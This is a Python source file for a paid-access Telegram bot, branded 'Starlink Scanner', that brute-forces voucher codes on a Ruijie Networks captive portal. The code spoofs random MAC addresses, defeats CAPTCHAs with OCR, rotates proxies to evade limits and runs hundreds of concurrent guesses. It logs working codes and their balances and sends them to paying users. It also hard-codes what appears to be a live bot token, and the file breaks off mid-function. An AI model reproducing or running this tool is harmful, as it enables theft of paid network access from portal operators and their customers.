# -*- coding: utf-8 -*-
#!/usr/bin/env python3
import os
import sys
import re
import json
import base64
import random
import string
import time
import asyncio
import aiohttp
import signal
from datetime import datetime, timedelta

try:
    import cv2
    import numpy as np
    import ddddocr
except ImportError as e:
    print(f"Missing required library: {e}. Please install: pip install opencv-python numpy ddddocr aiohttp python-telegram-bot")
    sys.exit(1)

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
import logging

# ── Disable Telegram logs ──────────────────────────────────────────
logging.basicConfig(level=logging.ERROR)

# ─── CONFIG ──────────────────────────────────────────────────────────
BOT_TOKEN = "8974924075:AAGKfax-dGNb9CvEFjLmxZKWwwB0s6tnSr8"
MAX_CONCURRENT = 500
BATCH_SIZE = 200
REQUEST_TIMEOUT = 8
CAPTCHA_RETRIES = 2
PROXY_FAIL_LIMIT = 3
ADMIN_ID = 8690698115

# Approved Users & Active Keys Database
APPROVED_USERS = {ADMIN_ID: "unlimited"}
ACTIVE_KEYS = []  

# ─── EMBEDDED PROXIES ──────────────────────────────────────────────
EMBEDDED_PROXIES = [
    # သင့် Proxy များကို ဒီနေရာမှာ ထည့်ပါ
]

# ─── GLOBALS ──────────────────────────────────────────────────────────
user_data = {}  
scan_tasks = {} 
scan_stats = {} 

proxy_list = []
proxy_stats = {}
proxy_fail_lock = asyncio.Lock()
proxy_index = 0
proxy_lock = asyncio.Lock()
GLOBAL_PROXY_ENABLED = True  

# Track which users are waiting for URL input
waiting_for_url = set()

_ocr = ddddocr.DdddOcr(show_ad=False)

GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
END = '\033[0m'

# ─── PROXY ROTATOR & MANAGEMENT ──────────────────────────────────────

def load_proxies():
    global proxy_list, proxy_stats
    raw_proxies = [line.strip() for line in EMBEDDED_PROXIES if line.strip()]
    proxy_list = [p for p in raw_proxies if p.startswith('http://') or p.startswith('https://')]
    
    for p in proxy_list:
        if p not in proxy_stats:
            proxy_stats[p] = {"fail_count": 0}
    
    print(f"{GREEN}✅ Loaded {len(proxy_list)} proxies successfully!{END}")
    return True

async def get_next_proxy():
    global proxy_index, GLOBAL_PROXY_ENABLED
    if not GLOBAL_PROXY_ENABLED:
        return None
        
    async with proxy_lock:
        if not proxy_list:
            return None
        attempts = 0
        while attempts < len(proxy_list):
            proxy = proxy_list[proxy_index % len(proxy_list)]
            proxy_index += 1
            attempts += 1
            stats = proxy_stats.get(proxy, {"fail_count": 0})
            if stats["fail_count"] < PROXY_FAIL_LIMIT:
                return proxy
        for p in proxy_list:
            proxy_stats[p]["fail_count"] = 0
        return proxy_list[0]

async def mark_proxy_fail(proxy):
    if not proxy:
        return
    async with proxy_fail_lock:
        if proxy in proxy_stats:
            proxy_stats[proxy]["fail_count"] += 1

async def mark_proxy_success(proxy):
    if not proxy:
        return
    async with proxy_fail_lock:
        if proxy in proxy_stats:
            proxy_stats[proxy]["fail_count"] = 0

async def check_single_proxy(proxy):
    test_url = "https://portal-as.ruijienetworks.com"
    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36'}
    start_time = time.time()
    try:
        conn = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=conn) as session:
            async with session.get(test_url, proxy=proxy, headers=headers, timeout=6) as resp:
                if resp.status < 500:
                    latency = round((time.time() - start_time) * 1000, 2)
                    return True, latency
    except Exception:
        pass
    return False, 0

def get_mac():
    return ':'.join(f'{random.randint(0x00, 0xff):02x}' for _ in range(6))

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

def format_time(seconds):
    if seconds <= 0:
        return "0s"
    if seconds > 86400:
        return f"{int(seconds/86400)}d {int((seconds%86400)/3600)}h"
    elif seconds > 3600:
        return f"{int(seconds/3600)}h {int((seconds%3600)/60)}m"
    elif seconds > 60:
        return f"{int(seconds/60)}m {int(seconds%60)}s"
    return f"{int(seconds)}s"

def minutes_to_display(minutes):
    if minutes == float('inf') or minutes >= 999999:
        return "Unlimited"
    if minutes <= 0:
        return "Expired"
    total_secs = minutes * 60
    if total_secs > 86400:
        days = int(total_secs / 86400)
        hours = int((total_secs % 86400) / 3600)
        mins = int((total_secs % 3600) / 60)
        return f"{days}d {hours}h {mins}m"
    elif total_secs > 3600:
        hours = int(total_secs / 3600)
        mins = int((total_secs % 3600) / 60)
        return f"{hours}h {mins}m"
    elif total_secs > 60:
        return f"{int(minutes)}m"
    else:
        return f"{int(total_secs)}s"

def _ocr_sync(image_bytes):
    try:
        nparr = np.frombuffer(image_bytes, np.uint8)
        img = cv2.imdecode(nparr, cv2.IMREAD_GRAYSCALE)
        if img is None:
            return None
        _, buffer = cv2.imencode('.png', img)
        return _ocr.classification(buffer.tobytes()).upper()
    except Exception:
        return None

async def ocr_text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

async def get_session_id(session, url, proxy):
    mac = get_mac()
    url = replace_mac(url, new_mac=mac)
    headers = {
        'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36',
        'accept': 'text/html',
    }
    try:
        kwargs = {"proxy": proxy} if proxy else {}
        async with session.get(url, headers=headers, allow_redirects=True, timeout=REQUEST_TIMEOUT, **kwargs) as resp:
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(resp.url))
            return sid.group(1) if sid else None
    except Exception:
        return None

async def fetch_captcha(session, session_id, proxy):
    params = {'sessionId': session_id, '_t': str(time.time())}
    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36'}
    try:
        kwargs = {"proxy": proxy} if proxy else {}
        async with session.get(
            'https://portal-as.ruijienetworks.com/api/auth/captcha/image',
            params=params, headers=headers, timeout=REQUEST_TIMEOUT, **kwargs
        ) as resp:
            return await resp.read()
    except Exception:
        return None

async def verify_captcha(session, session_id, text, proxy):
    json_data = {'sessionId': session_id, 'authCode': text}
    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36',
               'content-type': 'application/json'}
    try:
        kwargs = {"proxy": proxy} if proxy else {}
        async with session.post(
            'https://portal-as.ruijienetworks.com/api/auth/captcha/verify',
            headers=headers, json=json_data, timeout=REQUEST_TIMEOUT, **kwargs
        ) as resp:
            data = await resp.json()
            return data.get("success", False)
    except Exception:
        return False

async def post_voucher(session, session_id, code, captcha_text, proxy):
    post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    data = {
        "accessCode": code,
        "sessionId": session_id,
        "apiVersion": 1,
        "authCode": captcha_text,
    }
    headers = {
        "user-agent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36",
        "content-type": "application/json",
        "accept": "application/json, text/plain, */*",
    }
    try:
        kwargs = {"proxy": proxy} if proxy else {}
        async with session.post(
            post_url, json=data, headers=headers, timeout=REQUEST_TIMEOUT, **kwargs
        ) as resp:
            if resp.status == 200:
                try:
                    res_json = await resp.json()
                    if res_json.get("success") == True or res_json.get("code") == 0:
                        return "HIT"
                except:
                    pass
                
            text = await resp.text()
            if 'logonUrl' in text or 'success":true' in text or '"code":0' in text:
                return "HIT"
            elif 'STA' in text or 'limit' in text.lower():
                return "LIMIT"
            else:
                return "EXPIRED"
    except Exception:
        return "EXPIRED"

async def fetch_balance(session, session_id, proxy):
    endpoints = [
        f"https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}",
        f"https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}",
        f"https://portal-as.ruijienetworks.com/api/macc/balance/getBalance/{session_id}",
    ]
    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36',
               'accept': 'application/json'}
    for url in endpoints:
        try:
            kwargs = {"proxy": proxy} if proxy else {}
            async with session.get(url, headers=headers, timeout=REQUEST_TIMEOUT, **kwargs) as resp:
                if resp.status != 200:
                    continue
                data = await resp.json()
                if not data.get("success", False):
                    continue
                result = data.get("result", {})
                if not result:
                    result = data.get("data", {})
                minutes = None
                for key in ['totalMinutes', 'remainingMinutes', 'remainMinutes', 
                           'leftMinutes', 'balance', 'remaining']:
                    if key in result and result[key] is not None:
                        minutes = result[key]
                        break
                if minutes is None:
                    continue
                plan_name = result.get("profileName") or result.get("planName") or "Unknown"
                return plan_name, minutes
        except Exception:
            continue
    return "Unknown", 0

# ─── CODE GENERATORS ──────────────────────────────────────────────

def iter_digit_codes(mode, start_digit=None):
    length = int(mode)
    if mode in ["6", "7", "8", "9"]:
        if start_digit is not None and str(start_digit).isdigit():
            start = int(start_digit) * (10 ** (length - 1))
            end = (int(start_digit) + 1) * (10 ** (length - 1))
            codes = [str(i).zfill(length) for i in range(start, end)]
            random.shuffle(codes)
            yield from codes
            return
        else:
            if length >= 8:
                ranges = list(range(0, 100, 1))
                random.shuffle(ranges)
                for start_range in ranges:
                    start = start_range * (10 ** (length - 2))
                    end = (start_range + 1) * (10 ** (length - 2))
                    chunk_codes = [str(i).zfill(length) for i in range(start, end)]
                    random.shuffle(chunk_codes)
                    yield from chunk_codes
            else:
                codes = [str(i).zfill(length) for i in range(10 ** length)]
                random.shuffle(codes)
                yield from codes
            return
    else:
        raise ValueError(f"Unsupported digit mode: {mode}")

def iter_mixed(length=6):
    chars = string.ascii_lowercase + string.digits
    seen = set()
    while True:
        code = ''.join(random.choice(chars) for _ in range(length))
        if code not in seen:
            seen.add(code)
            yield code

def iter_lowercase(length=6):
    chars = string.ascii_lowercase
    seen = set()
    while True:
        code = ''.join(random.choice(chars) for _ in range(length))
        if code not in seen:
            seen.add(code)
            yield code

def iter_codes(mode, start_digit=None):
    if mode.startswith("mixed"):
        length = int(mode.replace("mixed", ""))
        return iter_mixed(length)
    elif mode.startswith("lower"):
        length = int(mode.replace("lower", ""))
        return iter_lowercase(length)
    elif mode in ["6", "7", "8", "9"]:
        return iter_digit_codes(mode, start_digit)
    else:
        raise ValueError(f"Unsupported mode: {mode}")

# ─── SCAN WORKER ──────────────────────────────────────────────────

async def scan_worker(code, semaphore, chat_id):
    global user_data, scan_stats
    stats = scan_stats.get(chat_id, {})
    if not stats:
        return
    stats["current_code"] = code
    async with semaphore:
        proxy = await get_next_proxy()
        try:
            session_url = user_data.get(chat_id, {}).get("url")
            if not session_url:
                return
            async with aiohttp.ClientSession(cookie_jar=aiohttp.CookieJar()) as session:
                session_id = await get_session_id(session, session_url, proxy)
                if not session_id:
                    await mark_proxy_fail(proxy)
                    stats["expired"] += 1
                    return
                captcha_solved = False
                text = ""
                for _ in range(CAPTCHA_RETRIES):
                    img = await fetch_captcha(session, session_id, proxy)
                    if not img:
                        continue
                    text = await ocr_text(img)
                    if not text:
                        continue
                    if await verify_captcha(session, session_id, text, proxy):
                        captcha_solved = True
                        break
                if not captcha_solved:
                    await mark_proxy_fail(proxy)
                    stats["expired"] += 1
                    return
                await mark_proxy_success(proxy)
                result = await post_voucher(session, session_id, code, text, proxy)
                if result == "HIT":
                    plan, minutes = await fetch_balance(session, session_id, proxy)
                    display_time = minutes_to_display(minutes)
                    hit_info = {"code": code, "plan": plan, "balance": display_time, "minutes": minutes}
                    stats["found"].append(hit_info)
                    stats["hits"] += 1
                    filename = f"Hitscode_{chat_id}.txt"
                    with open(filename, "a", encoding="utf-8") as f:
                        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] HIT: {code} | {plan} | {display_time}\n")
                elif result == "LIMIT":
                    stats["limits"] += 1
                else:
                    stats["expired"] += 1
        except Exception:
            await mark_proxy_fail(proxy)
            stats["expired"] += 1

# ─── SCANNER DASHBOARD ──────────────────────────────────────────────

async def run_bot_scanner(chat_id, mode, start_digit, context: ContextTypes.DEFAULT_TYPE):
    global scan_stats, user_data
    if chat_id not in scan_stats:
        scan_stats[chat_id] = {
            "tried": 0, "hits": 0, "expired": 0, "limits": 0,
            "current_code": "N/A", "start_time": time.time(), "found": [], "stop_flag": False
        }
    stats = scan_stats[chat_id]
    stats["start_time"] = time.time()
    stats["stop_flag"] = False
    semaphore = asyncio.Semaphore(MAX_CONCURRENT)
    try:
        code_gen = iter_codes(mode, start_digit)
    except ValueError as e:
        await context.bot.send_message(chat_id, f"❌ {str(e)}")
        return
    progress_msg = await context.bot.send_message(chat_id, "🔄 Preparing high-speed scanner dashboard...")
    last_update = time.time()
    try:
        while not stats["stop_flag"]:
            batch_tasks = []
            for _ in range(BATCH_SIZE):
                try:
                    code = next(code_gen)
                    batch_tasks.append(scan_worker(code, semaphore, chat_id))
                    stats["tried"] += 1
                except StopIteration:
                    stats["stop_flag"] = True
                    break
                except Exception:
                    stats["stop_flag"] = True
                    break
            if not batch_tasks:
                break
            await asyncio.gather(*batch_tasks, return_exceptions=True)
            if time.time() - last_update > 2.0:
                elapsed = time.time() - stats["start_time"]
                speed = (stats["tried"] / elapsed * 60) if elapsed > 0 else 0
                found_codes = stats["found"]
                if GLOBAL_PROXY_ENABLED:
                    active_proxies = sum(1 for p in proxy_list if proxy_stats.get(p, {}).get("fail_count", 0) < PROXY_FAIL_LIMIT)
                    proxy_status_text = f"{active_proxies}/{len(proxy_list)}"
                else:
                    proxy_status_text = "Disabled"
                
                # ═══ PREMIUM LIVE DASHBOARD ═══
                text = "╔══════════════════════════╗\n"
                text += "║  🛰️  𝐒𝐓𝐀𝐑𝐋𝐈𝐍𝐊  𝐒𝐂𝐀𝐍𝐍𝐄𝐑  🛰️  ║\n"
                text += "║    ⚡  𝐋𝐈𝐕𝐄  𝐃𝐀𝐒𝐇𝐁𝐎𝐀𝐑𝐃  ⚡    ║\n"
                text += "╚══════════════════════════╝\n"
                text += "💎 *By @nyatvip*\n\n"
                text += "┏━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                text += f"┃  🏹  𝐓𝐑𝐈𝐄𝐃     ➜  `{stats['tried']:,}`\n"
                text += f"┃  🎯  𝐂𝐔𝐑𝐑𝐄𝐍𝐓  ➜  `{stats['current_code']}`\n"
                text += f"┃  🔥  𝐇𝐈𝐓𝐒     ➜  `{stats['hits']}`\n"
                text += f"┃  ⚔️  𝐄𝐗𝐏𝐈𝐑𝐄𝐃  ➜  `{stats['expired']}`\n"
                text += f"┃  ⚠️  𝐋𝐈𝐌𝐈𝐓𝐒    ➜  `{stats['limits']}`\n"
                text += f"┃  ⚡  𝐒𝐏𝐄𝐄𝐃     ➜  `{speed:.1f} c/m`\n"
                text += f"┃  📡  𝐏𝐑𝐎𝐗𝐈𝐄𝐒  ➜  `{proxy_status_text}`\n"
                text += "┗━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
                text += "┏━━━━  🔥  𝐇𝐈𝐓  𝐂𝐎𝐃𝐄𝐒  🔥  ━━━━┓\n"
                if found_codes:
                    current_chunk = ""
                    for item in found_codes:
                        line = f"┃ 🎁 `{item['code']}`  »  {item['plan']}  »  ⏰ {item['balance']}\n"
                        if len(text) + len(current_chunk) + len(line) > 4000:
                            break
                        current_chunk += line
                    text += current_chunk
                else:
                    text += "┃   ⏳  𝐖𝐀𝐈𝐓𝐈𝐍𝐆  𝐅𝐎𝐑  𝐇𝐈𝐓𝐒...\n"
                text += "┗━━━━━━━━━━━━━━━━━━━━━━━┛"
                
                try:
                    await context.bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text, parse_mode='Markdown')
                except Exception:
                    pass
                last_update = time.time()
            await asyncio.sleep(0.05)
    except asyncio.CancelledError:
        stats["stop_flag"] = True
    finally:
        elapsed = time.time() - stats["start_time"]
        speed = (stats["tried"] / elapsed * 60) if elapsed > 0 else 0
        found_codes = stats["found"]
        
        # ═══ PREMIUM FINAL REPORT ═══
        final_text = "╔══════════════════════════╗\n"
        final_text += "║  🛑  𝐒𝐂𝐀𝐍  𝐅𝐈𝐍𝐈𝐒𝐇𝐄𝐃  🛑  ║\n"
        final_text += "║     ✦  𝐅𝐈𝐍𝐀𝐋  𝐑𝐄𝐏𝐎𝐑𝐓  ✦     ║\n"
        final_text += "╚══════════════════════════╝\n\n"
        final_text += "┏━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        final_text += f"┃  🏹  𝐓𝐑𝐈𝐄𝐃     ➜  `{stats['tried']:,}`\n"
        final_text += f"┃  🔥  𝐇𝐈𝐓𝐒     ➜  `{stats['hits']}`\n"
        final_text += f"┃  ⚔️  𝐄𝐗𝐏𝐈𝐑𝐄𝐃  ➜  `{stats['expired']}`\n"
        final_text += f"┃  ⚠️  𝐋𝐈𝐌𝐈𝐓𝐒    ➜  `{stats['limits']}`\n"
        final_text += f"┃  ⚡  𝐒𝐏𝐄𝐄𝐃     ➜  `{speed:.1f} c/m`\n"
        final_text += f"┃  ⏱️  𝐓𝐈𝐌𝐄      ➜  `{format_time(elapsed)}`\n"
        final_text += "┗━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
        
        if found_codes:
            final_text += f"┏━━  🎁  𝐅𝐎𝐔𝐍𝐃  𝐂𝐎𝐃𝐄𝐒  ({len(found_codes)})  🎁  ━━┓\n"
            for item in found_codes:
                line = f"┃ 🎁 `{item['code']}`  »  {item['plan']}  »  ⏰ {item['balance']}\n"
                if len(final_text) + len(line) > 4000:
                    break
                final_text += line
            final_text += "┗━━━━━━━━━━━━━━━━━━━━━━━┛"
            filename = f"Hitscode_{chat_id}.txt"
            with open(filename, "w", encoding="utf-8") as f:
                f.write("╔════════════════════════════════════════╗\n")
                f.write("║   🛰️  STARLINK SCANNER HITS REPORT  🛰️  ║\n")
                f.write("╚════════════════════════════════════════╝\n")
                f.write(f"📅 Generated : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"🔥 Total Hits: {len(found_codes)}\n")
                f.write("═" * 44 + "\n\n")
                for item in found_codes:
                    f.write(f"🎁 CODE    : {item['code']}\n")
                    f.write(f"   PLAN    : {item['plan']}\n")
                    f.write(f"   BALANCE : {item['balance']}\n")
                    f.write(f"   {'─' * 40}\n")
            if os.path.exists(filename):
                try:
                    with open(filename, "rb") as f:
                        await context.bot.send_document(
                            chat_id=chat_id, document=f, filename="Hitscode.txt",
                            caption=f"📁 **Hits Report**  »  🔥 Total: `{len(found_codes)}` codes\n💎 @nyatvip",
                            parse_mode='Markdown'
                        )
                except Exception as e:
                    print(f"File send error: {e}")
        else:
            final_text += "┏━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            final_text += "┃   📭  𝐍𝐎  𝐇𝐈𝐓𝐒  𝐅𝐎𝐔𝐍𝐃   ┃\n"
            final_text += "┗━━━━━━━━━━━━━━━━━━━━━━━┛"
        try:
            await context.bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=final_text, parse_mode='Markdown')
        except Exception:
            await context.bot.send_message(chat_id, final_text, parse_mode='Markdown')
        if chat_id in scan_tasks:
            del scan_tasks[chat_id]
        if chat_id in scan_stats:
            del scan_stats[chat_id]

# ─── SECURITY & AUTH MIDDLEWARE ──────────────────────────────────────

async def check_auth(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    chat_id = update.effective_chat.id
    user = update.effective_user
    
    if chat_id in APPROVED_USERS:
        expiry = APPROVED_USERS[chat_id]
        if expiry != "unlimited" and isinstance(expiry, (int, float)):
            if time.time() > expiry:
                del APPROVED_USERS[chat_id]
                await update.effective_message.reply_text("⏳ သင်၏ PAID KEY သက်တမ်း ကုန်ဆုံးသွားပါပြီ။")
                return False
        return True
    
    keyboard = [[InlineKeyboardButton("🔑  𝐄𝐍𝐓𝐄𝐑  𝐊𝐄𝐘  🔑", callback_data="enter_key_prompt")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.effective_message.reply_text(
        f"╔══════════════════════════╗\n"
        f"║  ⛔  𝐀𝐂𝐂𝐄𝐒𝐒  𝐃𝐄𝐍𝐈𝐄𝐃  ⛔  ║\n"
        f"╚══════════════════════════╝\n\n"
        f"🔐 User ID မထည့်ထားရင် **PAID KEY** ဝယ်ယူပါ\n"
        f"💎 **Contact:** @nyatvip\n\n"
        f"┏━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        f"┃  👤  𝐘𝐎𝐔𝐑  𝐔𝐒𝐄𝐑  𝐈𝐃\n"
        f"┃  `{user.id}`\n"
        f"┗━━━━━━━━━━━━━━━━━━━━━━━┛",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )
    
    try:
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"🔔 **New User Access Request:**\n"
                 f"• Name: {user.full_name}\n"
                 f"• Username: @{user.username if user.username else 'None'}\n"
                 f"• User ID: `{user.id}`",
            parse_mode='Markdown'
        )
    except Exception:
        pass
        
    return False

# ─── CONTROL PANEL KEYBOARDS ──────────────────────────────────────

def get_control_panel_keyboard(chat_id=None):
    """Main Control Panel with Premium Buttons"""
    current_mode = user_data.get(chat_id, {}).get("mode", "num6") if chat_id else "num6"
    proxy_count = len(proxy_list)
    keyboard = [
        [InlineKeyboardButton("🌐  𝐔𝐏𝐃𝐀𝐓𝐄  𝐏𝐎𝐑𝐓𝐀𝐋  🌐", callback_data="update_portal")],
        [InlineKeyboardButton(f"⚡  𝐌𝐎𝐃𝐄  »  {current_mode.upper()}  ⚡", callback_data="select_mode")],
        [InlineKeyboardButton(f"📡  𝐀𝐃𝐃  𝐏𝐑𝐎𝐗𝐈𝐄𝐒  »  [{proxy_count}]  📡", callback_data="add_proxies")],
        [InlineKeyboardButton("🚀  𝐒𝐓𝐀𝐑𝐓  𝐒𝐂𝐀𝐍𝐍𝐄𝐑  🚀", callback_data="start_scanner")],
        [InlineKeyboardButton("⛔  𝐒𝐓𝐎𝐏  𝐒𝐂𝐀𝐍  ⛔", callback_data="stop_scan_btn")],
    ]
    return InlineKeyboardMarkup(keyboard)

def get_mode_selection_keyboard():
    """Premium Mode Selection Keyboard"""
    keyboard = [
        [InlineKeyboardButton("🔢  NUM6", callback_data="setmode_num6"),
         InlineKeyboardButton("🔢  NUM7", callback_data="setmode_num7")],
        [InlineKeyboardButton("🔢  NUM8", callback_data="setmode_num8"),
         InlineKeyboardButton("🔢  NUM9", callback_data="setmode_num9")],
        [InlineKeyboardButton("🔤  ENG6", callback_data="setmode_eng6"),
         InlineKeyboardButton("🔤  ENG7", callback_data="setmode_eng7")],
        [InlineKeyboardButton("🔤  ENG8", callback_data="setmode_eng8"),
         InlineKeyboardButton("🔤  ENG9", callback_data="setmode_eng9")],
        [InlineKeyboardButton("🎲  MIXED6", callback_data="setmode_mixed6"),
         InlineKeyboardButton("🎲  MIXED7", callback_data="setmode_mixed7")],
        [InlineKeyboardButton("🎲  MIXED8", callback_data="setmode_mixed8"),
         InlineKeyboardButton("🎲  MIXED9", callback_data="setmode_mixed9")],
        [InlineKeyboardButton("💎  𝐕𝐎𝐔𝐂𝐇𝐄𝐑  𝐀𝐋𝐋  💎", callback_data="setmode_voucher")],
        [InlineKeyboardButton("🔙  𝐁𝐀𝐂𝐊  𝐓𝐎  𝐏𝐀𝐍𝐄𝐋", callback_data="back_to_panel")],
    ]
    return InlineKeyboardMarkup(keyboard)

async def send_control_panel(chat_id, context, message_id=None):
    """Send or edit the Premium Control Panel"""
    if GLOBAL_PROXY_ENABLED:
        active_proxies = sum(1 for p in proxy_list if proxy_stats.get(p, {}).get("fail_count", 0) < PROXY_FAIL_LIMIT)
        proxy_status = f"🟢 {active_proxies}/{len(proxy_list)} Online"
    else:
        proxy_status = "🔴 Disabled"
    
    current_mode = user_data.get(chat_id, {}).get("mode", "num6")
    if chat_id == ADMIN_ID:
        user_status = "👑 ADMIN  •  ∞ UNLIMITED"
    elif APPROVED_USERS.get(chat_id) == "unlimited":
        user_status = "💎 VIP  •  ∞ UNLIMITED"
    else:
        expiry = APPROVED_USERS.get(chat_id, 0)
        if isinstance(expiry, (int, float)) and expiry > time.time():
            remain = int(expiry - time.time())
            user_status = f"✅ ACTIVE  •  ⏳ {format_time(remain)}"
        else:
            user_status = "❓ UNKNOWN"
    
    text = (
        "╔══════════════════════════╗\n"
        "║   🛰️  𝐒𝐓𝐀𝐑𝐋𝐈𝐍𝐊  𝐒𝐂𝐀𝐍𝐍𝐄𝐑  🛰️   ║\n"
        "║      ✦  𝐏𝐑𝐄𝐌𝐈𝐔𝐌  𝐄𝐃𝐈𝐓𝐈𝐎𝐍  ✦      ║\n"
        "╚══════════════════════════╝\n\n"
        f"⚡ **MODE**  ➜  `{current_mode.upper()}`\n"
        f"📡 **PROXY**  ➜  `{proxy_status}`\n"
        f"🔑 **STATUS**  ➜  `{user_status}`\n\n"
        "┏━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃  💠  𝐂𝐎𝐍𝐓𝐑𝐎𝐋  𝐏𝐀𝐍𝐄𝐋  💠  ┃\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━┛"
    )
    
    keyboard = get_control_panel_keyboard(chat_id)
    
    if message_id:
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=text,
                reply_markup=keyboard,
                parse_mode='Markdown'
            )
        except Exception:
            await context.bot.send_message(chat_id=chat_id, text=text, reply_markup=keyboard, parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text=text, reply_markup=keyboard, parse_mode='Markdown')

# ─── TELEGRAM BOT HANDLERS ──────────────────────────────────────────

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_auth(update, context):
        return
    chat_id = update.effective_chat.id
    await send_control_panel(chat_id, context)

# ─── ADMIN COMMANDS ───────────────────────────────────────────────

async def genkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global ACTIVE_KEYS
    if update.effective_chat.id != ADMIN_ID:
        await update.message.reply_text("❌ ဤ Command သည် Admin အတွက် သီးသန့်ဖြစ်ပါသည်။")
        return
    
    args = context.args
    if len(args) < 2:
        await update.message.reply_text(
            "╔══════════════════════════╗\n"
            "║  🔑  𝐊𝐄𝐘  𝐆𝐄𝐍𝐄𝐑𝐀𝐓𝐎𝐑  🔑  ║\n"
            "╚══════════════════════════╝\n\n"
            "❌ ပုံစံမှားနေပါသည်။ ဥပမာအတိုင်း သုံးပါ:\n\n"
            "• `/genkey 30min 123456789`\n"
            "• `/genkey 1hour 123456789`\n"
            "• `/genkey 7day 123456789`\n"
            "• `/genkey 1month 123456789`\n"
            "• `/genkey 1year 123456789`\n"
            "• `/genkey unlimited 123456789`",
            parse_mode='Markdown'
        )
        return

    time_str = args[0].lower().strip()
    target_id_str = args[1].strip()

    try:
        target_id = int(target_id_str)
    except ValueError:
        await update.message.reply_text("❌ User ID မမှန်ကန်ပါ။ ဂဏန်းသာဖြစ်ရပါမည်။")
        return

    duration_seconds = 0
    display_desc = ""

    if time_str == "unlimited":
        duration_seconds = "unlimited"
        display_desc = "♾️ တစ်သက်စာ (Unlimited)"
    elif time_str.endswith("min"):
        try:
            val = int(time_str.replace("min", ""))
            duration_seconds = val * 60
            display_desc = f"⏱️ {val} မိနစ်စာ"
        except:
            pass
    elif time_str.endswith("hour"):
        try:
            val = int(time_str.replace("hour", ""))
            duration_seconds = val * 3600
            display_desc = f"⏱️ {val} နာရီစာ"
        except:
            pass
    elif time_str.endswith("day"):
        try:
            val = int(time_str.replace("day", ""))
            duration_seconds = val * 86400
            display_desc = f"⏱️ {val} ရက်စာ"
        except:
            pass
    elif time_str.endswith("month"):
        try:
            val = int(time_str.replace("month", ""))
            duration_seconds = val * 86400 * 30
            display_desc = f"⏱️ {val} လစာ"
        except:
            pass
    elif time_str.endswith("year"):
        try:
            val = int(time_str.replace("year", ""))
            duration_seconds = val * 86400 * 365
            display_desc = f"⏱️ {val} နှစ်စာ"
        except:
            pass

    if not duration_seconds:
        await update.message.reply_text("❌ အချိန်သတ်မှတ်ပုံ မမှန်ကန်ပါ။ (ဥပမာ: `30min`, `1hour`, `7day`, `1month`, `1year`, `unlimited`)", parse_mode='Markdown')
        return

    while True:
        random_key = "STLINK-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
        if not any(k_info["key"] == random_key for k_info in ACTIVE_KEYS):
            break

    created_time_str = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    ACTIVE_KEYS.append({
        "key": random_key,
        "duration": duration_seconds,
        "target_id": target_id,
        "created_at": created_time_str
    })
    
    await update.message.reply_text(
        f"╔══════════════════════════╗\n"
        f"║  🔑  𝐊𝐄𝐘  𝐆𝐄𝐍𝐄𝐑𝐀𝐓𝐄𝐃  🔑  ║\n"
        f"╚══════════════════════════╝\n\n"
        f"┏━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        f"┃  `{random_key}`\n"
        f"┗━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
        f"👤 **Target ID**  ➜  `{target_id}`\n"
        f"📌 **Duration**  ➜  **{display_desc}**\n"
        f"🕒 **Created**   ➜  `{created_time_str}`\n\n"
        f"⚠️ ဤ Key ကို သက်ဆိုင်ရာ User ID ပိုင်ရှင်ထံသာ ပေးပို့ပါ။",
        parse_mode='Markdown'
    )

async def delkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global ACTIVE_KEYS, APPROVED_USERS
    if update.effective_chat.id != ADMIN_ID:
        await update.message.reply_text("❌ ဤ Command သည် Admin အတွက် သီးသန့်ဖြစ်ပါသည်။")
        return
    
    args = context.args
    if not args:
        await update.message.reply_text("❌ ကျေးဇူးပြု၍ ဖျက်လိုသည့် Key (သို့) User ID ထည့်ပါ။\nဥပမာ: `/delkey STLINK-XXXXX` သို့မဟုတ် `/delkey 123456789`", parse_mode='Markdown')
        return
        
    query_val = args[0].strip()
    deleted_count = 0
    
    new_active_keys = []
    for info in ACTIVE_KEYS:
